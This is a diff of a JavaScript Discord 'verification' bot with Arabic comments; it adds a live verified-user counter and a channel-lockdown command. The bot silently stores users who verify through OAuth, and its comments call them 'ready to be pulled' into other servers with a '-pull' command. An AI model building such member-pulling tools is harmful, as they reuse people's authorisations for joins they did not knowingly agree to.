@@ -7,12 +7,11 @@ const {
     EmbedBuilder, 
     ButtonBuilder, 
     ButtonStyle, 
-    PermissionFlagsBits,
-    ChannelType,
     REST,
     Routes,
-    MessageFlags,
-    Events
+    PermissionFlagsBits,
+    Events,
+    ChannelType
 } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
@@ -42,10 +41,12 @@ const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);
 // ====================================================================
 
 const tempSetup = new Map(); 
+let liveCounterMessageId = null; // لتخزين أيدي رسالة العداد لتحديثها تلقائياً
+let liveCounterChannelId = null; // لتخزين قناة العداد المباشر
 
 app.get('/', (req, res) => res.send('OAuth2 Verify Bot with MongoDB is Running!'));
 
-// استقبال التحقق وحفظ العضو تلقائياً بداخل داتابيس المونجو صامتاً
+// استقبال التحقق وحفظ العضو تلقائياً بداخل داتابيس المونجو صامتاً وتحديث العداد المباشر
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
     const guildId = req.query.state; 
@@ -98,6 +99,23 @@ app.get('/callback', async (req, res) => {
             }
         }
 
+        // تحديث العداد المباشر للتحقق (Live Counter) تلقائياً فور إتمام التوثيق
+        if (liveCounterChannelId && liveCounterMessageId) {
+            const counterChannel = client.channels.cache.get(liveCounterChannelId);
+            if (counterChannel) {
+                const totalCount = await VerifiedUser.countDocuments();
+                const counterMessage = await counterChannel.messages.fetch(liveCounterMessageId).catch(() => null);
+                if (counterMessage) {
+                    const updatedEmbed = new EmbedBuilder()
+                        .setTitle('📊 عداد التحقق المباشر | Live Counter')
+                        .setDescription(`🟢 تم تحديث العداد تلقائياً وبشكل حي!\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
+                        .setColor('#2ecc71')
+                        .setTimestamp();
+                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
+                }
+            }
+        }
+
         // منح رتبة Verified تلقائياً وصامتاً للعضو بعد نجاح التحقق بداخل السيرفر الحالي
         if (guildId) {
             const guild = client.guilds.cache.get(guildId);
@@ -136,8 +154,12 @@ const COUNT_VERIFY_PREFIX = '-vf';    // فحص عدد الموافقين الإ
 const PULL_MEMBERS_PREFIX = '-pull';  // سحب وإدخال الأعضاء للسيرفر المحدد
 const LOG_VERIFY_PREFIX = '-tv';      // تحديد روم لوج التحقق الجديد
 
+// الميزات الجمالية والتحكم بالرومات الجديدة
+const LIVE_COUNTER_PREFIX = '-lc';    // إعداد وتفعيل عداد التحقق المباشر
+const HIDE_ROOMS_PREFIX = '-vv';      // قفل وإخفاء الرومات عن غير الموثقين لـ Verified فقط
+
 let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 
-let logVerifyChannelId = null; // لتخزين قناة لوج التحقق
+let logVerifyChannelId = null; 
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
@@ -260,7 +282,77 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // 3. فحص عدد الموثقين الإجمالي المخزن في MongoDB
+    // 3. تفعيل الـ Live Counter (عداد التحقق الحي المتحدث تلقائياً - `-lc`)
+    if (content === LIVE_COUNTER_PREFIX) {
+        if (!isAuthorized) return;
+
+        try {
+            const totalCount = await VerifiedUser.countDocuments();
+            const counterEmbed = new EmbedBuilder()
+                .setTitle('📊 عداد التحقق المباشر | Live Counter')
+                .setDescription(`🟢 جاري بدء المراقبة وتحديث الإحصائيات الحية...\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
+                .setColor('#2ecc71')
+                .setTimestamp();
+
+            const sentMessage = await message.channel.send({ embeds: [counterEmbed] });
+            liveCounterMessageId = sentMessage.id;
+            liveCounterChannelId = message.channel.id;
+
+            await message.reply('✅ **تم بنجاح تفعيل عداد التحقق المباشر في هذه القناة! سيقوم البوت بتحديث هذه الرسالة تلقائياً بمجرد توثيق أي عضو جديد.**');
+            await message.delete().catch(() => {});
+        } catch (err) {
+            console.error(err);
+        }
+        return;
+    }
+
+    // 4. قفل السيرفر بالكامل وإخفاء الرومات عن غير الموثقين وإتاحتها لـ Verified فقط (-vv)
+    if (content === HIDE_ROOMS_PREFIX) {
+        if (!isAuthorized) return;
+
+        const statusMsg = await message.reply('⏳ **جاري فحص قنوات السيرفر وتعديل الصلاحيات لحمايتها وإخفائها عن غير الموثقين...**');
+
+        const guild = message.guild;
+        const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
+
+        if (!verifiedRole) {
+            return statusMsg.edit('❌ لم يتم العثور على رتبة `Verified` في السيرفر لتهيئة الرومات عليها.');
+        }
+
+        let updatedCount = 0;
+
+        // المرور على جميع قنوات ورومات السيرفر وتأمينها تلقائياً وصامتاً
+        guild.channels.cache.forEach(async (channel) => {
+            // نقوم بتأمين رومات الكتابة والصوت التفاعلية فقط، ونتفادى قناة التحقق الحالية
+            if (channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice) {
+                if (channel.id !== message.channel.id && channel.id !== logVerifyChannelId) {
+                    try {
+                        // أ- إخفاء الروم وقفل رؤيته تماماً عن رتبة everyone (غير الموثقين)
+                        await channel.permissionOverwrites.edit(guild.id, {
+                            ViewChannel: false
+                        });
+
+                        // ب- إظهار وإتاحة الروم بشكل كامل وصامت لرتبة Verified (الموثقين)
+                        await channel.permissionOverwrites.edit(verifiedRole.id, {
+                            ViewChannel: true,
+                            SendMessages: true,
+                            ReadMessageHistory: true
+                        });
+                        updatedCount++;
+                    } catch (err) {
+                        // تخطي قنوات النظام أو القنوات المقفلة مسبقاً التي لا يملك البوت صلاحية لتعديلها
+                    }
+                }
+            }
+        });
+
+        setTimeout(async () => {
+            await statusMsg.edit(`✅ **اكتمل تأمين السيرفر بنجاح!**\n\n🔒 تم قفل وإخفاء \`${updatedCount}\` روم عن غير الموثقين، وإتاحتها تلقائياً فقط للأعضاء الذين يحملون رتبة **Verified**.`);
+        }, 3000);
+        return;
+    }
+
+    // 5. فحص عدد الموثقين الإجمالي المخزن في MongoDB
     if (content === COUNT_VERIFY_PREFIX) {
         if (!isAuthorized) return;
         try {
@@ -273,7 +365,7 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // 4. سحب الأعضاء الموثقين من قاعدة البيانات وإدخالهم تلقائياً للسيرفر المستهدف (-pull [أيدي السيرفر])
+    // 6. سحب الأعضاء الموثقين من قاعدة البيانات وإدخالهم تلقائياً للسيرفر المستهدف (-pull [أيدي السيرفر])
     if (content.startsWith(PULL_MEMBERS_PREFIX)) {
         if (!isAuthorized) return;
 
